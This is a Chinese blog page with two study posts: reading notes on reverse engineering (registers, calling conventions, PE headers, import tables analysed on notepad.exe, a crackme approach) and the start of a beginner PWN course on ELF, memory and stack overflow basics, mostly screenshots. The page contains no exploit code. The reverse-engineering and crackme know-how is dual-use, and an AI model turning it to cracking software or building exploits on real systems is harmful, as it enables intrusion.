      <h1 class="post-title"><a class="post-link" href="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">逆向工程核心原理读书笔记Book</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2020-10-27
        </span><span class="post-category">
            <a href="/categories/%E9%80%86%E5%90%91/">逆向</a>
            </span>
        <span class="post-visits"
             data-url="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"
             data-title="逆向工程核心原理读书笔记Book">
          Visits 0
        </span>
        </div>
    </header>

    <div class="post-content"><a id="more"></a>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>预估三个月，但说不定为了赶其他的ddl，也就读不完了，尽力去吧。只记些重要的</p>
<h1 id="第二章-逆向分析"><a href="#第二章-逆向分析" class="headerlink" title="第二章 逆向分析"></a>第二章 逆向分析</h1><p><strong>定位方法</strong></p>
<ol>
<li>直接执行</li>
<li>字符串定位</li>
<li>内存映射</li>
</ol>
<p><strong>修改字符串</strong></p>
<ol>
<li>直接缓存区修改，不能修改过长</li>
<li>改变栈地址，到一块空白的字符串</li>
</ol>
<h1 id="第四章-寄存器"><a href="#第四章-寄存器" class="headerlink" title="第四章 寄存器"></a>第四章 寄存器</h1><p><strong>寄存器</strong><br><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210309173427804.png" alt="image-20210309173427804"></p>
<ul>
<li>EAX：累加器（函数返回值）</li>
<li>EBX：基址寄存器</li>
<li>ECX：计数器（字符串和循环操作）</li>
<li>EDX：数据寄存器</li>
</ul>
<p><strong>段寄存器</strong></p>
<ul>
<li>CS：代码段</li>
<li>SS：栈段</li>
<li>DS：数据段</li>
<li>ES：附加段</li>
<li>FS：数据段</li>
<li>GS：数据段</li>
</ul>
<p><strong>标志寄存器</strong></p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210309175356181.png" alt="image-20210309175356181"></p>
<h1 id="第八章-crackme-2"><a href="#第八章-crackme-2" class="headerlink" title="第八章 crackme#2"></a>第八章 crackme#2</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test ax,ax</span><br><span class="line">&#x2F;&#x2F;两个数中一个为0-&gt;ZF&#x3D;1</span><br></pre></td></tr></table></figure>
<h2 id="解密算法分析"><a href="#解密算法分析" class="headerlink" title="解密算法分析"></a>解密算法分析</h2><h3 id="1-查找函数开始的部分"><a href="#1-查找函数开始的部分" class="headerlink" title="1.查找函数开始的部分"></a>1.查找函数开始的部分</h3><p>寻找有关生成栈帧的部分</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br></pre></td></tr></table></figure>
<h3 id="2-预测代码"><a href="#2-预测代码" class="headerlink" title="2.预测代码"></a>2.预测代码</h3><ul>
<li>读取name字符串（使用GetWindowText、GetDlgItemText）</li>
<li>启动循环，对字符串加密（XOR、ADD、SUB）</li>
</ul>
<h3 id="3-定位关键函数"><a href="#3-定位关键函数" class="headerlink" title="3.定位关键函数"></a>3.定位关键函数</h3><ul>
<li>观察每个函数的参数的变化</li>
<li>反复调试</li>
<li>要注意栈帧的变化</li>
<li>同时根据函数名字也可以看出点东西来</li>
</ul>
<h1 id="第十章-函数调用约定"><a href="#第十章-函数调用约定" class="headerlink" title="第十章 函数调用约定"></a>第十章 函数调用约定</h1><h2 id="10-1-函数调用约定"><a href="#10-1-函数调用约定" class="headerlink" title="10.1 函数调用约定"></a>10.1 函数调用约定</h2><p>主要有以下几种函数调用约定</p>
<ol>
<li>cdecl</li>
<li>stdcall</li>
<li>fastcall</li>
</ol>
<p>main中调用printf</p>
<p>则main为调用者，printf为被调用者</p>
<h3 id="cdecl"><a href="#cdecl" class="headerlink" title="cdecl"></a>cdecl</h3><p>调用者清理栈中的参数，这种叫做cdecl。</p>
<p>具体表现为就是esp加一定的数值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add esp,8</span><br></pre></td></tr></table></figure>
<blockquote>
<p>可以向被调用的函数传递长度可变的参数。</p>
</blockquote>
<h3 id="stdcall"><a href="#stdcall" class="headerlink" title="stdcall"></a>stdcall</h3><p>该方式主要是被调用者清理栈，c语言默认为cdecl。若要用此种方法，则要使用stdcall来编译</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include&quot;stdio.h&quot;</span><br><span class="line"></span><br><span class="line">int _stdcall add(int a,int b)</span><br><span class="line">&#123;</span><br><span class="line">	return(a+b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>具体表现为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">retn 8</span><br><span class="line">retn+pop 8</span><br></pre></td></tr></table></figure>
<h3 id="fastcall"><a href="#fastcall" class="headerlink" title="fastcall"></a>fastcall</h3><p>该方式与stdcall方式类似，但这种通常会用寄存器去传递那些需要传递给函数的部分参数。</p>
<p>举个例子，若一个函数有4个参数，那么前两个参数会使用ecx和edx来传递</p>
<p>此种方式调用较快，但由于需要用到寄存器。所以需要先备份寄存器里的内容。</p>
<h1 id="第十三章-PE文件格式"><a href="#第十三章-PE文件格式" class="headerlink" title="第十三章 PE文件格式"></a>第十三章 PE文件格式</h1><h2 id="13-1-介绍"><a href="#13-1-介绍" class="headerlink" title="13.1 介绍"></a>13.1 介绍</h2><p>PE文件是windows操作系统下使用的可执行文件格式</p>
<p>PE文件是指可执行的32位文件。64位可执行文件称为PE+或PE32+，是PE文件的一种扩展形式</p>
<h2 id="13-2-PE文件格式"><a href="#13-2-PE文件格式" class="headerlink" title="13.2 PE文件格式"></a>13.2 PE文件格式</h2><p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310153153376.png" alt="image-20210310153153376"></p>
<p>跟随书上一起分析</p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310153813415.png" alt="image-20210310153813415"></p>
<h3 id="1-基本结构"><a href="#1-基本结构" class="headerlink" title="1.基本结构"></a>1.基本结构</h3><p>PE头：从DOS头到节区头</p>
<p>PE体：余下部分</p>
<p>文件中使用偏移，内存中使用虚拟地址来表示位置。</p>
<p>文件内容一般有代码、数据、资源（.rsrc）节</p>
<p>各节区头定义了各节区在文件或内存中的大小、位置、属性等。</p>
<p><strong>这里有一个很重要的概念:最小基本单位。为了使文件/内存中各节区的位置处于最小单位的倍数位置上，我们通常会在其中添加NULL来补充</strong></p>
<p>如图所示</p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310154744199.png" alt="image-20210310154744199"></p>
<h3 id="2-VA-amp-RVA"><a href="#2-VA-amp-RVA" class="headerlink" title="2.VA&amp;RVA"></a>2.VA&amp;RVA</h3><p>VA：进程虚拟内存的绝对地址</p>
<p>RVA：从某个基准位置开始的相对地址</p>
<p>为什么要VA和RVA呢？</p>
<p>如果一个文件加载了多个dll文件，其VA是相同的，那么就会造成覆盖，导致程序加载不正常。</p>
<p>使用RVA，只要基址是恰当的，那么最终加载出来的程序也是可以正常运行的。</p>
<blockquote>
<p>base+RVA=VA</p>
</blockquote>
<h2 id="13-3-PE头"><a href="#13-3-PE头" class="headerlink" title="13.3 PE头"></a>13.3 PE头</h2><p>PE头有许多结构体，这里一一说一下</p>
<h3 id="1-DOS头"><a href="#1-DOS头" class="headerlink" title="1.DOS头"></a>1.DOS头</h3><p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310160306566.png" alt="image-20210310160306566"></p>
<blockquote>
<p>e_magic:DOS签名（4D5A）</p>
<p>e_lfanew:NT头的偏移</p>
</blockquote>
<p>我们看一下notepad的</p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310160550894.png" alt="image-20210310160550894"></p>
<p>这里e_lfanew是：000000E0</p>
<blockquote>
<p>Intel的CPU逆序存储，小端存储</p>
</blockquote>
<h3 id="2-DOS存根"><a href="#2-DOS存根" class="headerlink" title="2.DOS存根"></a>2.DOS存根</h3><p>DOS存根位于DOS头下方，且大小不固定</p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310161059662.png" alt="image-20210310161059662"></p>
<p>图中红线为汇编代码</p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310161449879.png" alt="image-20210310161449879"></p>
<p>意思也很简单，屏幕上写出一串字符串，然后退出。</p>
<h3 id="3-NT头"><a href="#3-NT头" class="headerlink" title="3.NT头"></a>3.NT头</h3><p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310161601066.png" alt="image-20210310161601066"></p>
<blockquote>
<p>4字节的签名</p>
<p>文件头</p>
<p>可选头</p>
</blockquote>
<p>notepad如下</p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310161746973.png" alt="image-20210310161746973"></p>
<h3 id="4-NT头：文件头"><a href="#4-NT头：文件头" class="headerlink" title="4.NT头：文件头"></a>4.NT头：文件头</h3><p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310161849517.png" alt="image-20210310161849517"></p>
<blockquote>
<p>以下四种如果设置不正确，将无法启动</p>
<p>1.Machine码</p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310162003248.png" alt="image-20210310162003248"></p>
<p>2.NumberOfSections</p>
<p>如其名，节区数量。定义节区数应与实际节区数对应</p>
<p>3.SizeOfOptionalHeader</p>
<p>可选节区头的大小，windows的PE文件通过查看该值来确定可选节区头的大小</p>
<p>4.Characteristics</p>
<p>该字段标识文件的属性、文件是否可运行、是否为dll文件等</p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310162608891.png" alt="image-20210310162608891"></p>
</blockquote>
<p>notepad的文件头</p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310162827298.png" alt="image-20210310162827298"></p>
<blockquote>
<p>014C:machine码 intel 386</p>
<p>0003:节区数</p>
<p>黄色是时间:48025287</p>
<p>00000000:offset to symbol table</p>
<p>00000000:number of symbols</p>
<p>00E0：可选头的大小</p>
<p>010F:Characteristics</p>
</blockquote>
<h3 id="5-可选头"><a href="#5-可选头" class="headerlink" title="5.可选头"></a>5.可选头</h3><p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310163334695.png" alt="image-20210310163334695"></p>
<blockquote>
<p>以下几种也是非常重要的</p>
<p>1.Magic</p>
<p>32是10B 64是20B</p>
<p>2.AddressOfEntryPoint</p>
<p>RVA值，指出程序最先执行代码的起始地址</p>
<p>3.ImageBase</p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310163616650.png" alt="image-20210310163616650"></p>
<p>4.SectionAlignment、FileAlignment</p>
<p>SectionAlignment定义节区在内存中最小单位、FileAlignment定义节区在磁盘中最小单位。</p>
<p>文件在磁盘和内存中大小必为这两个的整数倍</p>
<p>5.SizeOfImage</p>
<p>PE文件加载到内存时，该值定义了PE Image在虚拟内存中所占空间的大小</p>
<p>6.SizeOfHeaders</p>
<p>用来指出整个PE头的大小。该值为FileAlignment的整数倍</p>
<p>第一节区所在位置与SizeOfHeaders距文件开始偏移量相同</p>
<p>7.Subsystem</p>
<p>看是什么文件</p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310164312289.png" alt="image-20210310164312289"></p>
<p>8.NumberOfRvaAndSizes</p>
<p>用来定义最后一个元素的大小，虽说已经定义16，但也有可能不是16</p>
<p>9.DataDirectory</p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310164618863.png" alt="image-20210310164618863"></p>
<p>主要关注以下4个</p>
</blockquote>
<p>notepad的可选头</p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310164805130.png" alt="image-20210310164805130"></p>
<blockquote>
<p>1.magic:010B</p>
<p>2.AddressOfEntryPoint：00739D</p>
<p>3.ImageBase:01000000</p>
<p>4.SectionAlignment、FileAlignment:00001000 0000200 </p>
<p>6.SizeOfHeaders:00000400</p>
</blockquote>
<h3 id="6-节区头"><a href="#6-节区头" class="headerlink" title="6.节区头"></a>6.节区头</h3><p>节区头定义了节区的属性，不同节区有着不同的节区头。</p>
<p>各个区权限如下</p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310170851347.png" alt="image-20210310170851347"></p>
<p>节区头</p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310170937074.png" alt="image-20210310170937074"></p>
<p>VitrtualAddress和PointerToRawData不带任何值，分别由SectionAlignment、FileAlignment确定</p>
<p>VirtualSize和SizeOfRawData是不同的值，即加载大小是不同的。</p>
<p>Name字段是随意的，想放什么放什么。</p>
<p>notepad的节区头</p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310171432320.png" alt="image-20210310171432320"></p>
<blockquote>
<p>Name:2E746578 .text</p>
<p>PhysicalAddress:74000000</p>
<p>内存</p>
<p>VirtualSize 00007748</p>
<p>VirtualAddress:00001000</p>
<p>磁盘</p>
<p>SizeOfRawData:00007800</p>
<p>PointerToRawData:00000400</p>
</blockquote>
<h2 id="13-4-RVAtoRAW"><a href="#13-4-RVAtoRAW" class="headerlink" title="13.4 RVAtoRAW"></a>13.4 RVAtoRAW</h2><p>这里主要是讲一下从磁盘到内存映射的内容</p>
<p>PE文件加载到内存时，每个节区都要准确地完成内存地址与文件偏移间的映射</p>
<ol>
<li>查找RVA所在节区</li>
<li>计算文件偏移</li>
</ol>
<p>RAW=RVA-VirtualAddress+PointerToRawData</p>
<blockquote>
<p>RAW:相对文件偏移</p>
<p>RVA：相对内存偏移</p>
<p>VirtualAddress：内存中节区起始地址</p>
<p>PointerToRawData：磁盘中节区起始地址</p>
</blockquote>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310211021165.png" alt="image-20210310211021165"></p>
<h2 id="13-5-IAT"><a href="#13-5-IAT" class="headerlink" title="13.5 IAT"></a>13.5 IAT</h2><p>IAT（Import Address Table）导入地址表</p>
<p>EAT（Export Address Table）导出地址表</p>
<h3 id="1-dll"><a href="#1-dll" class="headerlink" title="1.dll"></a>1.dll</h3><p>dll（Dynamic Link Library）</p>
<ol>
<li>不需要把库包含到程序中，单独组成dll文件，需要时调用即可</li>
<li>内存映射技术使加载后的dll代码和资源在多个进程中共享</li>
<li>更新库时，只需要更新相关的dll文件即可</li>
</ol>
<p>显式链接：程序使用dll时加载，使用完毕后释放内存。</p>
<p>隐式链接：程序开始时就加载，程序终止时才释放内存</p>
<h3 id="2-IMAGE-IMPORT-DESCRIPTOR"><a href="#2-IMAGE-IMPORT-DESCRIPTOR" class="headerlink" title="2.IMAGE_IMPORT_DESCRIPTOR"></a>2.IMAGE_IMPORT_DESCRIPTOR</h3><p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310201607756.png" alt="image-20210310201607756"></p>
<p>导入多少库就有多少种这样的结构体，这些结构体形成了数组，且结构体数组最后以NULL结构体结束</p>
<p>主要看下面三个成员</p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310201721746.png" alt="image-20210310201721746"></p>
<p>这里说一下INT中各元素的值为IMAGE_IMPORT_BY_NAME结构体指针</p>
<p>我们看一下下面这张图就一目了然了</p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310202126351.png" alt="image-20210310202126351"></p>
<p>PE装载器的顺序：</p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310202304928.png" alt="image-20210310202304928"></p>
<h3 id="3-练习"><a href="#3-练习" class="headerlink" title="3.练习"></a>3.练习</h3><p>IMAGE_IMPORT_DESCRIPTOR在哪里？</p>
<p>我们还记得前面说过可选头里面有DataDirectory吗？这里面第二个成员就是IMPORT DIRECTORY</p>
<p>IMAGE_OPTIONAL_HEADER32.DataDirectory[1]:第一个4字节为虚拟地址，第二个四字节为size</p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310203430738.png" alt="image-20210310203430738"></p>
<p>这样我们算出在文件中的偏移：</p>
<p>7604-1000+400=6A04</p>
<p>我们来看一下文件中偏移</p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310204231228.png" alt="image-20210310204231228"></p>
<p>就是下图</p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310204430191.png" alt="image-20210310204430191"></p>
<p>接下来就是一个一个看了</p>
<p>1.Name</p>
<p>Name是字符串指针，指向导入函数所属库的文件名称。</p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310204717043.png" alt="image-20210310204717043"></p>
<p><strong>2.INT</strong></p>
<p>INT是一个包含导入函数信息的结构体指针数组。</p>
<p>只有这些信息才能在加载到进程内存的库中准确求得相应函数的起始地址。</p>
<p>INT由地址数组形式组成，每个地址值分别指向IMAGE_IMPORT_BY_NAME结构体</p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310204835996.png" alt="image-20210310204835996"></p>
<p><strong>3.IMAGE_IMPORT_BY_NAMEIMAGE_IMPORT_BY_NAME</strong></p>
<p>7A7A——&gt;6E7A</p>
<p>前面000F是Ordinal，是库中函数固有编号。</p>
<p>后面就是字符串</p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310205557622.png" alt="image-20210310205557622"></p>
<p><strong>4.IAT</strong></p>
<p>IAT同样也是由结构体指针数组组成，且以NULL结尾。</p>
<p>IAT第一个元素为76344906，这里notepad在加载到内存中会的替换该值。</p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310205918229.png" alt="image-20210310205918229"></p>
<p>但由于该dll文件ImageBase就是10000000，所以76344906就是该函数的地址</p>
<p><img src="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310210426731.png" alt="image-20210310210426731"></p>

        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/">PWN学习</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2020-10-24
        </span><span class="post-category">
            <a href="/categories/PWN/">PWN</a>
            </span>
        <span class="post-visits"
             data-url="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/"
             data-title="PWN学习">
          Visits 0
        </span>
        </div>
    </header>

    <div class="post-content"><a id="more"></a>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>纯零基础，大佬请略过</p>
<p>从零开始学习PWN,Web会去学，但可能现在大部分时间会用在PWN上，如果需要题的话可以评论</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/1603543652982.jpeg" alt="1603543652982"></p>
<p>大学中是研究深度还是广度，我可能还是需要选择一下</p>
<p>基本全是ppt截图</p>
<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201024233545234.png" alt="image-20201024233545234"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -S a.c #生成汇编文件</span><br><span class="line">file a.s #查看文件类型  可以看见是ascii文本</span><br><span class="line">gcc a.s  #生成可执行文件</span><br><span class="line">file a.out #可以看见是可执行文件</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201027230103100.png" alt="image-20201027230103100"></p>
<h2 id="ELF文件"><a href="#ELF文件" class="headerlink" title="ELF文件"></a>ELF文件</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201027230424200.png" alt="image-20201027230424200"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028164523021.png" alt="image-20201028164523021"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028164758641.png" alt="image-20201028164758641"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028165455072.png" alt="image-20201028165455072"></p>
<h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028170244054.png" alt="image-20201028170244054"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028171316681.png" alt="image-20201028171316681"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175015154.png" alt="image-20201028175015154"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175324930.png" alt="image-20201028175324930"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175515114.png" alt="image-20201028175515114"></p>
<h2 id="程序编译与链接"><a href="#程序编译与链接" class="headerlink" title="程序编译与链接"></a>程序编译与链接</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028180055683.png" alt="image-20201028180055683"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028180509024.png" alt="image-20201028180509024"></p>
<h2 id="程序装载与进程执行"><a href="#程序装载与进程执行" class="headerlink" title="程序装载与进程执行"></a>程序装载与进程执行</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028181509843.png" alt="image-20201028181509843"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182158445.png" alt="image-20201028182158445"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182509458.png" alt="image-20201028182509458"></p>
<h2 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182719496.png" alt="image-20201028182719496"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183231684.png" alt="image-20201028183231684"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183244082.png" alt="image-20201028183244082"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183715008.png" alt="image-20201028183715008"></p>
<h1 id="栈溢出基础"><a href="#栈溢出基础" class="headerlink" title="栈溢出基础"></a>栈溢出基础</h1><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a><strong>基本原理</strong></h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028210304426.png" alt="image-20201028210304426"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028210843823.png" alt="image-20201028210843823"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212002026.png" alt="image-20201028212002026"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212037049.png" alt="image-20201028212037049"></p>
